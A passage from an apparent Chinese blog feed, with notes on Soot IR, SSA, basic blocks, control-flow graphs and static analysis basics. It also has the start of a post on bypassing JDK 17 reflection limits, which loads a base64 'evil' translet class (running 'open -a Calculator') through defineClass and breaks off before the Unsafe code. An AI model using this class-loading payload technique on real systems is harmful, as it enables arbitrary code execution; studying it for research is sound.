class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">Class</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Class3AC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> <span class="variable">pi</span> <span class="operator">=</span> <span class="number">3.14</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 预先生成class文件，然后再执行Soot</span></span><br><span class="line">javac Class3AC.java</span><br><span class="line">java -<span class="built_in">cp</span> soot-4.6.0-jar-with-dependencies.jar:slf4j-nop-2.0.16.jar soot.Main -f J -pp -<span class="built_in">cp</span> . Class3AC</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Class3AC</span> <span class="keyword">extends</span> <span class="title class_">java</span>.lang.Object</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> pi;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> &lt;init&gt;()</span><br><span class="line">    &#123;</span><br><span class="line">        Class3AC r0;</span><br><span class="line"></span><br><span class="line">        r0 := <span class="meta">@this</span>: Class3AC;</span><br><span class="line"></span><br><span class="line">        specialinvoke r0.&lt;java.lang.Object: <span class="keyword">void</span> &lt;init&gt;()&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(java.lang.String[])</span></span><br><span class="line">    &#123;</span><br><span class="line">        java.lang.String[] r0;</span><br><span class="line"></span><br><span class="line">        r0 := <span class="meta">@parameter0</span>: java.lang.String[];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> &lt;clinit&gt;()</span><br><span class="line">    &#123;</span><br><span class="line">        &lt;Class3AC: <span class="type">double</span> pi&gt; = <span class="number">3.14</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Static-Single-Assignment"><a href="#Static-Single-Assignment" class="headerlink" title="Static Single Assignment"></a>Static Single Assignment</h2><p><font style="color:#000000;">Static Single Assignment（静态单一赋值，SSA），在3AC的基础上，</font><strong><font style="color:#000000;">SSA指的是所有赋值操作的被赋值变量都需要有一个单独的名字</font></strong><font style="color:#000000;">。每个定义都会有一个新名字，这个新名字可以应用在后续的分析中，每个变量都有一个定义。</font></p><ul><li><font style="color:#000000;">Give each definition a fresh name</font></li><li><font style="color:#000000;">Propagate fresh name to subsequent uses</font></li><li><font style="color:#000000;">Every variable has exactly one definition</font></li></ul><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1729847552420-1f1fab94-76df-4c9d-a5de-b7374f7cece6.png"></p><p><font style="color:#000000;">但是有些时候，某些变量可能受到条件分支影响，处于控制流汇聚的位置（control flow merges），此时就需要使用φ函数来处理，其中，φ(x</font><sub><font style="color:#000000;">0</font></sub><font style="color:#000000;">,x</font><sub><font style="color:#000000;">1</font></sub><font style="color:#000000;">)的值由控制流经过的条件分支决定。</font></p><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1729847688406-4d7dda1f-635a-4d8c-94b9-c95e5df17272.png"></p><p><font style="color:#000000;">SSA的优缺点如下：</font></p><ul><li>优点<ul><li><font style="color:#000000;">控制流信息可以间接融合到独特变量名中，简化分析过程</font></li><li><font style="color:#000000;">Define-and-Use配对是明确清楚的</font></li></ul></li><li>缺点<ul><li><font style="color:#000000;">可能引入过多变量和φ函数</font></li><li><font style="color:#000000;">可能造成机器码生成效率低下</font></li></ul></li></ul><h2 id="Basic-Blocks"><a href="#Basic-Blocks" class="headerlink" title="Basic Blocks"></a>Basic Blocks</h2><p><font style="color:#000000;">Basic Block指的是一个连续、最长的3AC序列，该序列具有以下特性：</font></p><ul><li><strong><font style="color:#000000;">控制流只能从该序列的起始指令进入</font></strong></li><li><strong><font style="color:#000000;">控制流只能从该序列的最后一条指令退出</font></strong></li></ul><p><font style="color:#000000;">那么针对一段3AC，如何将其划分成不同的Basic Block呢？根据Basic Block的定义，不难构造如下的算法来划分Basic Block。</font></p><p><font style="color:#000000;">确定3AC序列中的leaders，leaders包括具有以下特性的指令：</font></p><ul><li><font style="color:#000000;">3AC序列中的第一条指令</font></li><li><font style="color:#000000;">所有有条件跳转或无条件跳转的所有目标指令</font></li><li><font style="color:#000000;">所有有条件跳转或无条件跳转后面的一条指令</font></li></ul><p><font style="color:#000000;">构建3AC序列的BB：</font></p><ul><li><font style="color:#000000;">BB包含leader指令及其后面紧邻的所有非leader指令</font></li></ul><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1730003760922-b663a8b6-e2c5-49e2-8f0f-453e6a07b4d5.png"></p><p><font style="color:#000000;">下图是一个3AC划分为不同的Basic Block的结果。</font></p><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1730008032177-852866e9-d06a-40b6-806b-b8127b8851f9.png"></p><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1730003894313-c12ab365-ecdf-40bf-9f0f-909b03e9b5c8.png"></p><h2 id="Control-Flow-Graphs"><a href="#Control-Flow-Graphs" class="headerlink" title="Control Flow Graphs"></a>Control Flow Graphs</h2><p><font style="color:#000000;">除了Basic Block，Control Flow Graphs中还会有块到块的边。在划分好Basic Block的基础上，可以构建CFG。CFG具有如下特性：</font></p><ul><li><strong><font style="color:#000000;">The nodes of CFG are basic blocks</font></strong></li><li><font style="color:#000000;">There is an edge from block A to block B if and only if</font><ul><li><strong><font style="color:#000000;">There is a conditional or unconditional jump from the end of A to the beginning of B</font></strong><font style="color:#000000;">（A的末尾有一条指向了B开头的有条件或无条件跳转指令）</font></li><li><strong><font style="color:#000000;">B immediately follows A in the original order of instructions and A does not end in an unconditional jump</font></strong><font style="color:#000000;">（B是A后面的紧邻块且A最后一条指令不是无条件跳转）</font></li></ul></li></ul><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1730008612798-50159c1e-a71e-43be-8c0d-6c54381a3b34.png"></p><ul><li><strong><font style="color:#000000;">It is normal to replace the jumps to instruction labels by jumps to basic blocks</font></strong><font style="color:#000000;">（将原来3AC序列中的所有“跳转到某指令标签处”改为“跳转到某基本块处”）</font></li></ul><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1730009210921-6d7355ed-8a0a-4615-91a3-4b7943c2e5b6.png"></p><p><font style="color:#000000;">根据上文CFG的特性，下图是在划分好Basic Block的基础上构建的CFG。</font></p><ul><li><font style="color:#000000;">在A-&gt;B中，A是B的前驱（predecessor），B是A的后继（successor）</font></li><li><font style="color:#000000;">除了构建好的Basic Block，还会额外添加两个结点，入口（Entry）和出口（Exit）</font><ul><li><font style="color:#000000;">这两个结点不对应任何IR</font></li><li><font style="color:#000000;">入口有一条边指向IR中的第一条指令当某个Basic Block的最后一条指令会让程序离开这段IR，则该Basic Block会有一条边指向出口</font></li></ul></li></ul><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1730009536856-01268634-e6fe-4613-a7c6-ab1a2d3c57a0.png"></p>]]></content>
      
      
      <categories>
          
          <category> 静态代码分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态代码分析 </tag>
            
            <tag> 南大软分学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>南大软分学习笔记-Introduction</title>
      <link href="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/"/>
      <url>/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/</url>
      
        <content type="html"><![CDATA[<h2 id="Programming-Languages"><a href="#Programming-Languages" class="headerlink" title="Programming Languages"></a>Programming Languages</h2><p><strong><font style="color:#000000;">静态程序分析</font></strong><font style="color:#000000;">是</font><strong><font style="color:#000000;">编程语言</font></strong><font style="color:#000000;">中应用层面下的一个细分领域，它是一个非常重要的核心内容。</font></p><p><font style="color:#000000;">Programming Languages可以大致分为三个部分：</font></p><ul><li><strong><font style="color:#000000;">在理论部分</font></strong><font style="color:#000000;">，考虑的是如何设计一个语言的语法和语义，如何设计语言的类型系统等等问题。</font></li><li><strong><font style="color:#000000;">在环境部分</font></strong><font style="color:#000000;">，由于已经有了语言的语法、语义和类型系统，需要支撑语言的运行，因此需要考虑如何为运行中的程序提供运行时环境，即如何设计编译器，在运行时需要怎样的支持（如内存的分配管理）等等。</font></li><li><strong><font style="color:#000000;">在应用部分</font></strong><font style="color:#000000;">，则需要关注如何保证语言所写出程序的效率、安全性和可靠性，主要考虑如何对程序进行分析，验证和合成（如何自动合成一个程序）。</font></li></ul><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729694621188-c5cda1e1-c406-467e-996e-ebb32820f71c.png"></p><h2 id="Background-Challenge"><a href="#Background-Challenge" class="headerlink" title="Background &amp; Challenge"></a>Background &amp; Challenge</h2><p><font style="color:#000000;">Background: In the last decade, the language cores had few changes, but </font><strong><font style="color:#000000;">the programs became significantly larger and more complicated</font></strong><font style="color:#000000;">.</font></p><p><font style="color:#000000;">Challenge: How to ensure the </font><strong><font style="color:#000000;">reliability, security and other promises</font></strong><font style="color:#000000;"> of large-scale and complex programs?</font></p><h2 id="Necessity"><a href="#Necessity" class="headerlink" title="Necessity"></a>Necessity</h2><ul><li><strong><font style="color:#000000;">提高程序可靠性</font></strong><font style="color:#000000;">：空指针引用，内存泄漏等。</font></li><li><strong><font style="color:#000000;">提高程序安全性</font></strong><font style="color:#000000;">：隐私信息泄露、注入攻击等。</font></li><li><strong><font style="color:#000000;">编译优化</font></strong><font style="color:#000000;">：消除程序死代码（不会对程序执行结果产生影响的代码）、代码移动（通过重新排列指令来提高程序的性能，通常发生在编译器的中间代码生成或优化阶段）等。</font></li><li><strong><font style="color:#000000;">提高程序可读性</font></strong><font style="color:#000000;">：集成开发环境（IDE）、代码调用层级（Call Hierarchy）、类型指示（Type Indication）等。</font></li></ul><h2 id="Static-Program-Analysis"><a href="#Static-Program-Analysis" class="headerlink" title="Static Program Analysis"></a>Static Program Analysis</h2><p><font style="color:#000000;">简单来说，静态分析就是通过分析程序来推断其行为，并在运行程序之前确定该程序是否满足某些属性。（Static analysis analyzes a program P to reason about its behaviors and determines whether it satisfies some properties before running P）例如：</font></p><ul><li><font style="color:#000000;">程序是否包含任何隐私信息泄露？</font></li><li><font style="color:#000000;">程序是否引用任何空指针？</font></li><li><font style="color:#000000;">程序中的所有强制转换操作是否安全？</font></li><li><font style="color:#000000;">程序中的指针1和指针2可以指向相同的内存位置吗？</font></li><li><font style="color:#000000;">程序中的某些断言语句会失败吗？</font></li><li><font style="color:#000000;">程序中的这段代码是死的吗（这样它就可以被消除）？</font></li></ul><blockquote><p><strong>Rice’s Theorem: Any non-trivial property of the behavior of programs in a r.e. language is undecidable.</strong></p></blockquote><p><font style="color:#000000;">Rice’s Theorem（莱斯定理）证明，对于任何非平凡的部分函数属性，不存在一种通用且有效的方法来决定一个算法是否计算具有该属性的部分函数。换句话说，</font><strong><font style="color:#000000;">没有有效的方法仅通过查看程序代码即可确定函数的非平凡属性</font></strong><font style="color:#000000;">（即上述示例中提到的空指针引用、隐私信息泄露等）。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729697168476-7b4c3be6-77ba-47b1-a1de-dffecce72a27.png"></p><p><font style="color:#000000;">进一步理解，在下图中，莱斯定理指出不存在一个Perfect Static Analysis（例如空指针问题中，Perfect Static Analysis指的就是能够准确地给出是否存在空指针漏洞，存在几个空指针漏洞等）。</font></p><p><strong><font style="color:#000000;">一个Perfect Static Analysis必须满足Sound又Complete</font></strong><font style="color:#000000;">。具体地说， Truth可以理解为程序中有N个空指针漏洞；Sound表示报告包含了所有的真实错误，但可能包含了误报的错误；Complete表示报告包含的错误都是真实的错误，但可能并未包含全部的错误。那么Sound、Truth和Complete之间的关系为</font><strong><font style="color:#000000;">Complete ⊆ Truth ⊆ Sound</font></strong><font style="color:#000000;">，Sound称之为over-approximate，Complete称之为under-approximate。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729697587651-51486139-8a8b-4d1d-a491-50045373b7bf.png"></p><p><font style="color:#000000;">既然不存在Perfect Static Analysis，即无法同时满足Sound和Complete，那么可以妥协其中一方，在某种程度上牺牲Sound或Complete中的一个，即Useful Static Analysis。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729698633761-e775ff4f-94e4-4861-8e7a-d42dcf385103.png"></p><p><font style="color:#000000;">在Useful Static Analysis中，妥协soundness，会造成false negatives（漏报）；妥协completeness，会造成false positives（误报）。</font></p><p><font style="color:#000000;">通常情况下，</font><strong><font style="color:#000000;">静态分析时总是选择牺牲completeness，保全soundness</font></strong><font style="color:#000000;">。即，宁可有误报，也不漏掉一个正确结果。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729698818693-ca38fd56-9d25-403a-a187-6a8af3e2e397.png"></p><p><font style="color:#000000;">那么为什么总选择保全Soundness呢？</font></p><ol><li><strong><font style="color:#000000;">Soundness is critical to a collection of important (static-analysis) applications</font></strong><font style="color:#000000;">, such as compiler optimization and program verification.</font></li><li><strong><font style="color:#000000;">Soundness is also preferable to other (static-analysis) applications for which soundness is not demanded</font></strong><font style="color:#000000;">, e.g., bug detection, as better soundness implies more bugs could be found.</font></li></ol><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p><font style="color:#000000;">在下图示例代码中，存在两种不同表述的分析结果：</font></p><ul><li><font style="color:#000000;">当input为true时，x等于1；当input为false时，x等于0。</font></li><li><font style="color:#000000;">x等于1或0。</font></li></ul><p><font style="color:#000000;">但是这两个分析都是sound的，区别在于，前者结果更精确，但是耗时长；后者结果不精确，但是速度快。因此，</font><strong><font style="color:#000000;">静态分析时通常需要尽力确保soundness，并在precision和speed之间做取舍</font></strong><font style="color:#000000;">。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729700169457-c6f3b9f4-e926-415a-8d4b-437b6c1348fc.png"></p><h2 id="Abstraction-Over-approximation"><a href="#Abstraction-Over-approximation" class="headerlink" title="Abstraction &amp; Over-approximation"></a><font style="color:#000000;">Abstraction &amp; Over-approximation</font></h2><p><font style="color:#000000;">大多数静态分析都可以用abstraction和over-approximation两个词概括，而后者又包含transfer functions和control flows。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729700566139-5c282687-b942-4130-b118-9d0e51bd5fdf.png"></p><p><strong><font style="color:#000000;">Abstraction是指将变量从concrete domain映射到abstract domain（符合集合）</font></strong><font style="color:#000000;">，方便后续处理。由于在程序中，变量很可能是不确定的（unknown）或非法、未定义（undefined）的。因此，</font><strong><font style="color:#000000;">abstract domain包含五类符号+−O⊤⊥，其中⊤表示unknown，⊥表示undefined</font></strong><font style="color:#000000;">。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729700963485-a209566c-c4dc-4c98-a746-3d93bc778435.png"></p><p><font style="color:#000000;">Over-approximation中的transfer functions定义了怎样在abstract values上对程序语句求值。transfer functions通常根据要分析的问题和程序语句相关的语义确定。对于算数运算，相关的transfer functions可以由算术运算规则和特性生成。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729701401089-9582fb6d-6dc7-4609-a4f4-cbff1e7f24cc.png"></p><p><font style="color:#000000;">Over-approximation中的control flows指的是，在实际场景中进行控制流相关的静态分析时，由于无法枚举所有路径，我们通常采用flow merging（一种over-approximation的方式）来处理。</font></p><p><img src="/2024/10/24/%E5%8D%97%E5%A4%A7%E8%BD%AF%E5%88%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/1729701339427-88fedb44-b37d-4690-88cf-476679c0d109.png"></p>]]></content>
      
      
      <categories>
          
          <category> 静态代码分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态代码分析 </tag>
            
            <tag> 南大软分学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unsafe绕过高版本JDK反射限制</title>
      <link href="/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/"/>
      <url>/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><font style="color:#000000;">从JDK8迁移到更高版本的JDK时，在安全性方面做了很大的提升，从JDK9开始引入的模块化系统，到JDK16进一步加强。JDK的强封装是一个重要的特性，它旨在提高JDK的安全性和可维护性，同时减少对非标准、内部JDK实现细节的依赖。</font><strong><font style="color:#000000;">JDK17及以后的版本默认对Java本身代码使用强封装</font></strong><font style="color:#000000;">（Strong Encapsulation），这意味着使用反射访问JDK内部API的代码将不再被允许，</font><strong><font style="color:#000000;">任何对java.*代码中的非公共字段和方法进行反射将抛出InaccessibleObjectException异常</font></strong><font style="color:#000000;">。</font></p><p><font style="color:#000000;">但是需要注意，</font><strong><font style="color:#000000;">sun.misc和sun.reflect包可供所有JDK版本（包括JDK17）中的工具和库进行反射</font></strong><font style="color:#000000;">。</font></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Java Version: &quot;</span> + System.getProperty(<span class="string">&quot;java.version&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilClassBase64</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcAGwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAA9DYWxjdWxhdG9yLmphdmEMAAcACAcAHAwAHQAeAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAfACABAApDYWxjdWxhdG9yAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvbGFuZy9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAACgAEAAsADQAMAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAABYACwAAAAQAAQAPAAEAEQAAAAIAEg==&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(evilClassBase64);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ((Class) method.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Calculator&quot;</span>, bytes, <span class="number">0</span>, bytes.length)).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">在JDK8版本下，正常反射调用，且没有警告等信息。</font></p><p><img src="/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/1729614269491-8fcad471-fdae-4261-8df9-763ce3aff2f3.png"></p><p><font style="color:#000000;">在JDK9~JDK16版本下，正常反射调用，但是会出现警告信息。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WARNING: An illegal reflective access operation has occurred</span><br><span class="line">WARNING: Illegal reflective access by org.example.Main (file:/Users/alphag0/Desktop/Demo/target/classes/) to method java.lang.ClassLoader.defineClass(java.lang.String,<span class="type">byte</span>[],<span class="type">int</span>,<span class="type">int</span>)</span><br><span class="line">WARNING: Please consider reporting <span class="built_in">this</span> to the maintainers of org.example.Main</span><br><span class="line">WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations</span><br><span class="line">WARNING: All illegal access operations will be denied in a future release</span><br></pre></td></tr></table></figure><p><img src="/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/1729614347238-e7fabd17-ba84-4bca-b553-3431205ae671.png"><font style="color:#000000;">在JDK17及以上版本下，反射调用失败，抛出异常java.lang.reflect.InaccessibleObjectException。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.reflect.InaccessibleObjectException: Unable to make <span class="keyword">protected</span> <span class="keyword">final</span> java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,<span class="type">byte</span>[],<span class="type">int</span>,<span class="type">int</span>) <span class="keyword">throws</span> java.lang.ClassFormatError accessible: <span class="keyword">module</span> java.base does not <span class="string">&quot;opens java.lang&quot;</span> to unnamed <span class="keyword">module</span> @4bde3f8a</span><br><span class="line">at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:<span class="number">354</span>)</span><br><span class="line">at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:<span class="number">297</span>)</span><br><span class="line">at java.base/java.lang.reflect.Method.checkCanSetAccessible(Method.java:<span class="number">199</span>)</span><br><span class="line">at java.base/java.lang.reflect.Method.setAccessible(Method.java:<span class="number">193</span>)</span><br><span class="line">at org.example.Main.main(Main.java:<span class="number">12</span>)</span><br></pre></td></tr></table></figure><p><img src="/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/1729614453473-bebf93e8-a111-4402-bcae-c71eeac1335f.png"></p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="Unsafe"><a href="#Unsafe" class="headerlink" title="Unsafe"></a><font style="color:rgb(51, 51, 51);background-color:rgb(253, 253, 253);">Unsafe</font></h3><p><font style="color:#000000;">Unsafe是位于sun.misc包下的一个类，主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，这些方法在提升Java运行效率、增强Java语言底层资源操作能力方面起到了很大的作用。但由于Unsafe类使Java语言拥有了类似C语言指针一样操作内存空间的能力，这无疑也增加了程序发生相关指针问题的风险。在程序中过度、不正确使用Unsafe类会使得程序出错的概率变大，使得Java这种安全的语言变得不再“安全”，因此对Unsafe的使用一定要慎重。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 